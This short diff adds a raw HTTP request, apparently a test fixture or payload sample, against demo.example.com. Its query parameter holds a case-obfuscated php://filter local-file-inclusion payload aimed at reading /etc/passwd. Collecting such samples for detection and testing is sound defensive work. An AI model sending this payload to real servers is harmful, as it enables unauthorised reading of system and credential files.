@@ -1,0 +1,4 @@
+GET /a?search=pHp://FiLtEr/CoNvErT.bAsE64-eNcOdE/rEsOuRcE%3D/eTc/PaSsWd HTTP/1.1
+Host: demo.example.com
+Connection: close
+
